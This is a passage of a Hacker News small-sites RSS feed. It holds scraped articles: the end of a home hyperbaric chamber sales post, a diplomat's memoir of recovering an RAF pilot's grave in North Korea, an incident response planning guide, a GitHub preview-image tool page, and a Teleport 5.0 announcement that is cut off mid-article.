<li><a href="https://atlantahyperbariccenter.com/33-dive-mild-hyperbaric-chamber-for-sale/"><strong>33″ Hyperbaric Chamber</strong> </a>– $8,800 for this mid range home hyperbaric chamber.&nbsp; 33″ diameter and 7 foot long.&nbsp; This chamber can fit easily a parent and child or two adult.&nbsp; This chamber comes with two pumps and external frame with foam mattress.</li> <li><a href="https://atlantahyperbariccenter.com/demo-34-hyperbaric-chamber/"><strong>34″ Hyperbaric Chamber</strong></a> – $6895 This chamber comes with one pump but you can upgrade to two (recommended).&nbsp; 34″ diameter and 8′ long.&nbsp; This chamber has three windows and the front facing windows in made of plexiglass that does not satin, fade or dry rot.&nbsp; This chamber can be used for home or professional use.</li> <li><a href="https://atlantahyperbariccenter.com/60-vertical-hyperbaric-chamber-bundle/"><strong>60″ Vertical Hyperbaric Chamber</strong></a> – $14,995 This is the largest home chamber on the market and by far my favorite.&nbsp; I have owned several of these chambers and I personally have one of these in my master bedroom. .&nbsp; I love it.&nbsp; The footprint is not bad only 6ft. square do you need for the space.&nbsp; You can easily fit a parent and child or two adults in this awesome chamber.&nbsp; The versatility is pulse you can sit in a chair, relax in a bean bag or lay down.</li> </ol> <p>I hope this article helps you choose the best home hyperbaric chamber.&nbsp; Please share if you think this article could help someone choose the best hyperbaric chamber.&nbsp; Check out my Youtube channel for more great hyperbaric videos.&nbsp; If you are interested in a private home hyperbaric chamber please feel free to call me or my team 770-948-4511. Thank you for taking the time for reading my article.</p> <p>Yours in health</p> <p>Dr. Louis Hilliard DC</p> <p><a href="https://atlantahyperbariccenter.com/why-buy-a-hyperbaric-chamber-from-us/" target="_blank" rel="noopener noreferrer">Why buy a hyperbaric chamber from Us</a></p> <p><a href="https://atlantahyperbariccenter.com/buy-a-hyperbaric-chamber/" target="_blank" rel="noopener noreferrer">Buy A Hyperbaric Chamber</a></p> <p><a href="https://atlantahyperbariccenter.com/how-to-buy-a-hyperbaric-chamber/" target="_blank" rel="noopener noreferrer">How To Buy a Hyperbaric Chamber</a></p> <p><a href="https://atlantahyperbariccenter.com/home-hyperbaric-chambers/" target="_blank" rel="noopener noreferrer">Home Hyperbaric Chamber</a></p>  </div> </div>  <div data-id="75cc0d4e" data-element_type="widget" data-widget_type="author-box.default"> <div> <div> <p><img alt="Doctor Lou" nitro-lazy-src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/desktop/optimized/rev-6136258/avatar/5841d7da8b6c7d486226c9358f93fc5a.93e242e68dccd9519161ce66e0681872" nitro-lazy-empty="" id="MTUwODoxMTk=-1" src="data:image/svg+xml;nitro-empty-id=MTUwODoxMTk=-1;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzAwIDMwMCIgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PC9zdmc+"> </p> <div> <p> <h4>Doctor Lou</h4> </p> <p> Hello, my name is Dr. Louis Hilliard and I am the owned of Atlanta Hyperbaric Center and Georgia Licensed Chiropractor. I opened one of the first private hyperbaric centers in 2006 and I have been helped thousands of people with their hyperbaric needs. </p> </div> </div> </div> </div>   </div> </div> </div>  </div> </div> </section> </div> </div> </main> </div> </div> </div></div>]]>
            </description>
            <link>https://atlantahyperbariccenter.com/the-5-best-home-hyperbaric-chambers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151375</guid>
            <pubDate>Thu, 19 Nov 2020 16:51:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[British Diplomat Works with North Korean Military]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25151330">thread link</a>) | @Hansig_jw
<br/>
November 19, 2020 | https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/ | <a href="https://web.archive.org/web/*/https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/thumbnail-1/#main"><img width="400" height="311" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" alt="Flt Lt Hinton North Korea" aria-describedby="gallery-1-980" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?w=400&amp;ssl=1 400w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?resize=300%2C233&amp;ssl=1 300w" data-lazy-sizes="(max-width: 400px) 100vw, 400px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-980"> Flt Lt Hinton with USAF colleagues -Photo David Hinton</figcaption></figure></div><p>To tell people that a<strong> British diplomat</strong> had a close working relationship with the <strong>North Korean military</strong> for a 6 month period would in itself raise more than a few eyebrows. Working for 3 years in North Korea was on the one hand a time of frustration and on the other a time of discovery in this fascinating yet enigmatic country. Butting heads on a daily basis with the stifling North Korean bureaucracy was always a battle, but occasionally there was a glimmer of achievement and sometimes from the most unlikeliest of sources.</p><div id="gallery-2"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/download-4/#main"><img width="510" height="339" src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?fit=510%2C339&amp;ssl=1&amp;is-pending-load=1" alt="" aria-describedby="gallery-2-1251" data-lazy-srcset="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?w=510&amp;ssl=1 510w, https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?resize=300%2C199&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/download-4.jpg?fit=510%2C339&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-2-1251"> British Embassy Pyongyang, North Korea</figcaption></figure></div><p>In early 2004, I was contacted at the embassy in<strong> Pyongyang</strong> by the brother of an RAF pilot who had been shot down in 1952 over North Korea during the Korean war. He said he had full details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he sent to me) and wished to visit the area to discover the fate of his brother.</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><p>This seemed a daunting request, but nevertheless I submitted it to the North Koreans and having gone through the usual long and tortuous channels I was surprised to receive an invitation to a meeting with senior North Korean military officers to discuss the request. Soon after therefore, it was with some degree of trepidation that I and my interpreter set off to meet these senior officers at a large military base on the outskirts of Pyongyang.</p><p>Driving into the base, we stopped at the entrance guard house and I was told to leave my diplomatic vehicle parked there. Then my interpreter and I climbed into a small military vehicle with an officer who my interpreter told me would be our liaison officer for the visit.</p><p>The base was huge. We drove past ranks of tanks, armoured vehicles and lorries which appeared to be in pristine (and highly polished) condition. I did learn later that this base was one of several in the Pyongyang garrison that supplied vehicles for the massed televised parades.</p><p>A short while later we pulled up outside a large office building. Our liaison officer led us in and up the stairs to a large conference room where sat several high ranking officers. There were also some junior officers milling around as well as a couple of shady looking civilians who never took their eyes off me for the whole meeting. Very disconcerting.</p><div id="gallery-3"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0156/#main"><img width="510" height="383" src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="My Diplomatic Life" aria-describedby="gallery-3-1253" data-lazy-srcset="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?w=510&amp;ssl=1 510w, https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-3-1253"> Social Meeting with North Korean Colonel</figcaption></figure></div><p>Some commands were rapped out in Korean and everyone sat down. I then outlined my request to them and also provided them with all the relevant information that had been sent to me from the UK. They listened politely. They were very courteous and the atmosphere was more relaxed than I had anticipated. When I had finished my spiel and before they responded to my request, tea was brought in and they all lit up cigarettes. As I drank my tea, they all began a long conversation amongst themselves.</p><p>Finally, they said they would investigate this case and get back in touch. So thinking that this was an end to the proceedings, I stood up preparing to leave, but surprisingly no, it was not quite the end. They invited me to have lunch with them, which took me completely off guard.</p><p>Before I could respond, another command was rapped out and a series of orderlies wheeled in trollies containing a cold buffet and drink. The buffet was well prepared but the only downside was at the end of the meeting there were several toasts which meant imbibing several shots of the lethal North Korean Soju the after effects of which I did in due course suffer!</p><p>So the meeting finally came to an end. I thought that after this first meeting, that would be the end of it. I would get the usual reply back saying this request was not possible to facilitate. The Korean War was something that the North Koreans revered. Museums full of captured allied equipment, films, memorials, statues and posters depicting their glorious victory abounded everywhere. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><div id="gallery-4"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0169-1/#main"><img width="510" height="383" src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="North Korea" aria-describedby="gallery-4-1254" data-lazy-srcset="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?w=510&amp;ssl=1 510w, https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-4-1254"> North Korea</figcaption></figure></div><p>But surprisingly, no.</p><p>Against all expectations, they did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. This spot had been identified and human bones and fragments of uniform and aircraft were also uncovered. This scenario is somewhat similar to my previous post <a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p>This news then led over the next six months to a long series of meetings, usually weekly either at Army HQ in Pyongyang, the crash site or at a military base on the outskirts of the city chaired on the military side by Senior Colonel Kwak Chol-hui who was to be my main point of contact for this project. I am glad to report that the two shady civilians from our first meeting never did make a reappearance.</p><p>The Colonel who would later go on to be promoted to Major General was responsible throughout the negotiations for arranging visits to the site, meetings with the two surviving eyewitnesses and agreeing that Flt Lt Hinton’s brother would be fast tracked for a visa and allowed to visit the DPRK site to pay his final respects to his brother.</p><p>True to their word, Flt Lt Hinton’s brother was granted his visa and permitted to visit the village. At a meeting we had with the military, he was offered the choice of having his brother’s remains repatriated to the south via Panmunjon or re-buried on the outskirts of the village. He chose the latter. Therefore, the military re-buried his remains in a properly marked grave and on the final day of his visit, he was part of a small, brief ceremony attended by members of the British Embassy, North Korean military and villagers.</p><p>Despite my requests, the North Koreans had refused to allow me to obtain a properly inscribed headstone from the Commonwealth War Graves Commission, so a simple marker was used instead. Overall, it was a small victory but did give some form of closure to the family of Flt Lt Hinton.</p><p>As mentioned above, I met Colonel Kwak Chol-hui (pictured above with me at a Queens Birthday Party celebration in Pyongyang) and his team on many occasions over that 6 month period. As well as working on the Hinton project, he also eased the process of enabling me to take the very rare numbers of visitors we got down to the DMZ at Panmunjon as part of their “North Korean experience”. The other was the USS Pueblo where the military arranged private tours for me (Pueblo post to follow).</p><p>At Panmunjon, when I took visitors down to view the DMZ, we were always hosted by the military who would lay on briefings and guides for our visitors as well as a lunch afterwards. I could always see the look of bewilderment on the faces of the South Korean border guards and US military standing a few feet away on the southern side of the demarcation line wondering who these foreigners were on the other side looking a tad too cosy with North Korean officers!</p><p><b><i>*All of the above pre-supposes that this was the happy ending and finality for everyone involved. However, this was not to be the case as several years later a cruel deception was exposed, which I will be writing about shortly*</i></b></p><div heateor-sss-data-href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/"><p>Spread the love</p><ul><li><a data-pin-lang="en_US" href="https://www.pinterest.com/pin/create/button/?url=https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/" data-pin-count="false" data-pin-do="buttonPin" data-pin-config="beside"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845" data-recalc-dims="1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845"></a></li></ul></div></div></div>]]>
            </description>
            <link>https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151330</guid>
            <pubDate>Thu, 19 Nov 2020 16:47:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to create Incident Response plan for security teams?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151319">thread link</a>) | @gunal2
<br/>
November 19, 2020 | https://letsdefend.io/blog/how-to-create-incident-response-plan/?q=hackernews | <a href="https://web.archive.org/web/*/https://letsdefend.io/blog/how-to-create-incident-response-plan/?q=hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<h2>What is incident response?</h2>



<p>Incident response is an approach to managing a security incident process. An incident response plan is needed to approach security incidents systematically. A successful incident response plan includes the following 6 stages:</p>



<p>1- Preparation</p>



<p>2- Identification</p>



<p>3- Scope</p>



<p>4- Eradication</p>



<p>5- Recovery</p>



<p>6- Lessons Learned</p>



<p>If you want to practice about incident response, you can use our blue team training platform <a aria-label="undefined (opens in a new tab)" href="https://letsdefend.io/" target="_blank" rel="noreferrer noopener">LetsDefend </a>for free.</p>



<h3>1- Preparation</h3>



<p><strong>Creating a Central Registration System</strong></p>



<p>It is important in terms of saving time that all data can be examined from a single point with a central log collection system that can manage large files.</p>



<p><strong>Time Synchronization</strong></p>



<p>Enabling NTP on all devices in the network is important for matching the time information of the logs collected.</p>



<p><strong>User Account Management</strong></p>



<p>The fact that the user names of different accounts belonging to personnel are the same and different from other personnel makes it easy to monitor user activities in the event of an event.</p>



<p><strong>Management of System and Service Accounts</strong></p>



<p>The administrators of the services and systems used should be appointed and a document should be created on how to reach these managers if needed.</p>



<p><strong>Asset Management</strong></p>



<p>Instant access to information such as devices, operating systems, patch versions, and critical status should be available.</p>



<p><strong>Secure Communication</strong></p>



<p>If necessary, the team may need to communicate independently of the internal network, for such cases mobile phone or secondary emails can be used.</p>



<p><strong>Legal Transactions</strong></p>



<p>The method of who will initiate the judicial process and in which situations should be determined before the incident occurs.</p>



<h3>2- Identification</h3>



<p><strong>Review</strong></p>



<p>For a potential suspicious incident, preliminary information about the incident should be gathered. Then it must be decided whether the situation is a suspicious event or not.</p>



<p><strong>Assignment</strong></p>



<p>The first person to examine the incident must be determined. The person should take notes about the review.</p>



<p><strong>Using the Checklist</strong></p>



<p>There should be checklists for the analysis to be made in order to ensure consistent responses to incidents.</p>



<h3>3- Scope</h3>



<p><strong>Characterize the event</strong></p>



<p>Since determining the event will determine the actions to be taken, it is important to determine the type of the incoming event. EX: DDoS, malware infection, data leak …</p>



<p><strong>Taking Action</strong></p>



<p>Action should be taken according to the technique used to intercept the attacker’s method quickly. If there is an account that it has captured, simple measures such as account deactivation and IP blocking should be done quickly.</p>



<p><strong>Data collecting</strong></p>



<p>The image of the volatile memory along with the firewall, network traffic and other logs will be required for the investigation.</p>



<p><strong>Isolation</strong></p>



<p>Unplugging the compromised system&nbsp; could be a solution, isolating it is a more viable solution.</p>



<p>After the systems affected by the incident are determined, the possibility of the attacker’s spread in the network is cut and volatile information is collected, the next step can be passed.</p>



<h3>4- Eradication</h3>



<p><strong>Identifying the Root Cause</strong></p>



<p>With the information obtained in the 2nd and 3rd stages, the root cause of the event should be determined. The attacker must then be completely kick out.</p>



<p><strong>Determining Rootkit Potential</strong></p>



<p>If rootkits are suspected in the system, the disk should be cleaned and a clean backup installed. After the installation, the latest updates of the existing applications and systems should be installed.</p>



<p><strong>Improve Defense</strong></p>



<p>Operating systems, applications used, network, DMZ etc. The deficiencies of defense in areas should be determined and work should be done on how to make improvement.</p>



<p><strong>Vulnerability Scan</strong></p>



<p>Potential attack points on networks and systems should be identified and corrected by performing vulnerability scans.</p>



<p>When the necessary arrangements are prepared to prevent the event from recurring, the recovery phase can be started.</p>



<h3>5- Recovery</h3>



<p><strong>Verification</strong></p>



<p>Verify that logging, systems, applications, databases, and other operations work correctly.</p>



<p><strong>Restore</strong></p>



<p>At this stage, the restore operation is coordinated.</p>



<p><strong>Monitoring</strong></p>



<p>Systems should be monitored for recurring events.</p>



<p>When there is no repetitive harmful situation or unusual activity, the next step is taken.</p>



<h3>6- Lessons Learned</h3>



<p><strong>Writing a Follow-up Report</strong></p>



<p>The report includes the examinations with the expert and the executive, the stages of good and bad working in the intervention plan, and the recommendations regarding the process. The report should be written in a way that the manager is sure that the event has been closed.</p>



<p><strong>References</strong></p>



<ul><li><a href="https://www.cmu.edu/iso/governance/procedures/docs/incidentresponseplan1.0.pdf">https://www.cmu.edu/iso/governance/procedures/docs/incidentresponseplan1.0.pdf</a></li><li>Blue Team Handbook: Incident Response Edition</li></ul>





		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://letsdefend.io/blog/how-to-create-incident-response-plan/?q=hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151319</guid>
            <pubDate>Thu, 19 Nov 2020 16:46:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Open graph image generator for your GitHub repositories]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25151272">thread link</a>) | @joemasilotti
<br/>
November 19, 2020 | https://www.mugshotbot.com/github | <a href="https://web.archive.org/web/*/https://www.mugshotbot.com/github">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div data-controller="customize"><div data-target="customize.error"><div><div><div><div><p>Something went wrong, please try again.</p></div></div></div></div></div><div><div><div><h3>GitHub social previews</h3><p>Create unique social preview images for your GitHub repositories. No design tools or code needed.</p></div><div><form data-target="customize.form" enctype="multipart/form-data" action="github.json" accept-charset="UTF-8" data-remote="true" method="post"><div><fieldset><label for="mugshot_url"><p>GitHub repository</p><p>What repo are you creating a social preview for?</p></label></fieldset><hr><fieldset><legend>Theme</legend><p>The overall appearance and layout of your link preview.</p></fieldset></div></form></div></div><div><div data-target="customize.preview"><p>Your GitHub social preview</p><div><div><div><p>Source for masilotti.com, built with Jekyll and Tailwind CSS.</p><div><p><img src="https://avatars3.githubusercontent.com/u/2092156?v=4"></p><div><p>Joe Masilotti</p><p>joemasilotti</p></div></div></div></div></div><div><div><div><div><div><div><p>Step 2</p><p>Share your repository</p></div><p>When you share a link to your repository this image will be used automatically.</p></div><a target="_blank" href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2Fjoemasilotti%2Fmasilotti.com&amp;via=TheMugshotBot"><svg viewBox="0,0,20,20" fill="currentColor">
  <path d="M6.29 18.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0020 3.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.073 4.073 0 01.8 7.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 010 16.407a11.616 11.616 0 006.29 1.84"></path>
</svg>
Tweet</a></div></div></div></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.mugshotbot.com/github</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151272</guid>
            <pubDate>Thu, 19 Nov 2020 16:42:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Announcing Teleport 5.0 - Unified Access Plane and Application Access]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151232">thread link</a>) | @twakefield
<br/>
November 19, 2020 | https://goteleport.com/blog/application-access-announcement/ | <a href="https://web.archive.org/web/*/https://goteleport.com/blog/application-access-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <a href="https://goteleport.com/blog/index.xml"><i></i></a>
      
      

        

<p><img src="https://goteleport.com/blog/images/2020/application-access-announcement-header.png" width="100%" alt="Teleport 5.0 application access announcement"></p>

<h2 id="introduction">Introduction</h2>

<p>Today, we are announcing the availability of Teleport 5.0. This is a major release for the project with numerous improvements and new features, but the hallmark capability of this version is the <a href="https://goteleport.com/teleport/">Unified Access Plane</a> and <a href="https://goteleport.com/teleport/application/">Application Access</a> for Developers.</p>

<p>For those unfamiliar with Teleport, it is an open source project for giving developers secure remote access to everything they need. It started as a replacement for OpenSSH, then added Kubernetes access, and today we’re adding HTTPS as another protocol.</p>

<h2 id="application-access-for-developers">Application Access for Developers</h2>

<p>Do you have internal dashboards running inside your production or staging environments? Perhaps a couple of Jenkins servers, maybe a Kubernetes web UI, or other tools accessible via a browser? The old school method of accessing them was setting up a VPN, with extra points for configuring each of those apps to authenticate via some sort of a directory.</p>

<p>A better method is to embrace the <a href="https://goteleport.com/blog/vpns-and-zero-trust-thoughts-on-the-evolving-nature-of-remote-access/">Zero Trust</a> principle and expose all of your internal application endpoints to the internet with proper identity-based authentication with MFA. This creates work: getting a public IP, configuring DNS, maintaining X.509 certificates, setting up SAML integrations, etc. Just maintaining the inventory of all available HTTPS endpoints is work. Setting this up to qualify a SOC2, PCI or FedRAMP compliance is also work, and keeping your setup this way is a tiny bit of extra never-ending work.</p>

<p>This isn’t rocket science, but we believe it must not be something that you should be spending your time on. Besides, if the operational costs of securely exposing another internal tool to the team was zero, we would all enjoy more tools.</p>

<p>Consider another use case: a web application running behind NAT on a third party network. To make it entertaining, think of a web app running on a self-driving vehicle with an ever-changing IP address. If you ship devices with web dashboards to be deployed inside customer networks, how do you access them from the outside?</p>

<p>This is why we’ve added Application Access to Teleport 5.0. It allows users to visit the Teleport proxy in a browser and see a live inventory of applications running anywhere in the world. Each web application is just an HTTPS URL provided by Teleport, so you can have:</p>

<ul>
<li><a href="https://jenkins.proxy.example.com/">https://jenkins.proxy.example.com</a></li>
<li><a href="https://grafana.proxy.example.com/">https://grafana.proxy.example.com</a></li>
<li><a href="https://your-own-app.example.com/">https://your-own-app.example.com</a></li>
</ul>

<p>…and more. An application can be added or removed with just a couple of clicks. It can even be completely automated. Here’s how it looks in the Web UI:

<video autoplay="" loop="" muted="" playsinline="">
  <source src="https://goteleport.com/blog/images/2020/k8s-taa.mp4" type="video/mp4">
  <source src="https://goteleport.com/blog/images/2020/k8s-taa.webm" type="video/webm">
Your browser does not support the video tag.
</video>
</p>

<h2 id="how-does-application-access-work">How does Application Access Work?</h2>

<p>Teleport, for those who have never used it, is a single dependency-free binary which can run as a Linux daemon or can be deployed as a Kubernetes pod. Not surprisingly, this binary is called <code>teleport</code>.</p>

<p><code>teleport</code> behaves differently based on the command-line arguments or via a configuration file. It can run in several modes, also called roles. Combining them together allows you to tailor Teleport deployment to your needs:</p>

<ul>
<li><em>Proxy service</em>, if started as <code>teleport start --roles=proxy</code></li>
<li><em>An application access service,</em> if started as <code>teleport start --roles=app</code> (shown as “sidecar” on the diagram)</li>
</ul>

<p>Here’s an example of how these services can work together to give developers seamless access to internal web apps with a single login:</p>

<p><img width="60%" src="https://goteleport.com/blog/images/2020/application-access-announcement-2.png" alt="how a proxy service and application access service work together"></p>

<p>Let’s consider how connectivity is established first, and then we’ll cover authentication.</p>

<h3 id="connectivity">Connectivity</h3>

<p>The diagram above is self-explanatory:</p>

<ul>
<li>A Teleport Proxy service must be running somewhere and exposed to the public internet. The proxy is the single access point that can be used to access applications anywhere. The proxy is not a single point of failure as you can have several copies behind a network load-balancer or via a DNS split.</li>
<li>Each private network needs to run a copy of <code>teleport</code> running with <code>--roles=app</code>. This process is a sidecar, which creates an encrypted outbound tunnel to the Teleport proxy. The tunnel is permanent, and if the proxy becomes unavailable, or if the Internet connectivity is not reliable, the sidecar will be trying to reconnect when possible.</li>
<li>Each app gets a DNS name issued by the proxy, so if the proxy is running on <code>proxy.example.com</code>, you may have Jenkins available as <code>jenkins.proxy.example.com</code>. This DNS name also points at the proxy.</li>
<li>When a user tries to access <code>jenkins.proxy.example.com</code>, their request will be proxied through the suitable tunnel to the sidecar responsible for this app, and from there a connection to the actual Jenkins instance will be made.</li>
</ul>

<p>This architecture is fairly flexible, as it allows users to have sidecars running inside their networks, proxying access to all applications on that network. They can also be bundled with applications (inside the same Kubernetes pod, for example), so the apps can be configured to only listen on <code>localhost</code>. This guarantees that the only way to access an application is via the Teleport proxy.</p>

<h3 id="authentication">Authentication</h3>

<p>Obviously, the proxy is protected. Teleport supports multiple authentication methods:</p>

<ul>
<li><em>The local database of users with MFA</em>. This is suitable for quick experimentation and as a “Plan B” when other methods are not available.</li>
<li><em>Popular public identity providers</em> such as Github and Google, so you can configure the proxy to trust a certain Github team or a Google Apps group.</li>
<li><em>Corporate SSO</em> logins via SAML. Examples include Active Directory, Okta, Auth0, OneLogin, and so on.</li>
</ul>

<p>The identity of users is passed to applications via HTTP headers. If an application is capable of understanding this information, it will not present its own login screen. But even if an application is not built to understand such headers, users will have to login again using in-app authentication. It’s worth noting that Teleport proxy, when integrated with SSO, usually bothers users with a login just once per day, and most legacy apps offer “remember me” functionality, so the double-login for most use cases is not an issue.</p>

<h2 id="who-is-application-access-for">Who is Application Access for?</h2>

<p>Teleport Application access is naturally a great capability boost for existing Teleport users, who’re using it to get instant SSH to their environments. As a developer, a single login once per day should give you auto-expiring credentials for everything you need to be productive, be it a Jenkins instance, or Kubernetes clusters, or SSH nodes.</p>

<p>Teleport Application Access gives security professionals easy access controls to internal apps, so achieving FedRAMP compliance even for legacy internal applications becomes quite easy.</p>

<p>But even as a hobbyist, I have been enjoying having access to my Synology home NAS or to my printer’s web UI on the go!</p>

<h2 id="other-improvements">Other Improvements</h2>

<p>Teleport 5.0 comes with improved Kubernetes Access. In addition to connecting SSH nodes to a Teleport cluster, users can now configure Teleport to provide access to multiple Kubernetes clusters running behind NAT. This brings all three types of access to an equal footing:</p>

<ul>
<li>SSH Access</li>
<li>Application Access</li>
<li>Kubernetes Access</li>
</ul>

<p>The end result is an engineer getting access to all three with a single login.</p>

<h2 id="the-future-of-teleport">The Future of Teleport</h2>

<p>Traditionally, open source projects of similar architecture were called “proxies,” or simply “servers”, as in SSH server. Such a description never felt right for Teleport because its mission is to provide instant <em>access for engineers to any computing resource anywhere in the world</em>. Calling it a server or a proxy did not feel right, as its purpose was to remove machine and network boundaries and create an illusion of all computing resources being in the same “room” as an engineer.</p>

<p>Starting with version 5.0, Teleport will be known as a <strong>Unified Access Plane</strong>. Greg Chase, who runs our Product Marketing function, coined the term. It fits perfectly with our vision of erasing access boundaries between computing resources and environments.</p>

<p>The cloud has largely replaced the notion of a “computer” for most developers, as we create programs to run “in the cloud” now. The cloud is a collection of geographically scattered production environments, each consisting of ever-growing in height tech stacks. It is, essentially, a single-purpose, custom “computer” that we build from virtual parts supplied by the cloud providers. This computer currently lacks an operating system or standardization of any kind and we’re still stitching together solutions from good ole days to run our stuff on it, including remote access solutions. The list of “computer components” is long and each component currently comes with its own remote access facility: SSH, RDP, K8s API, databases, internal dashboards, etc. Ending this fragmentation is what Teleport is about.</p>

<blockquote>
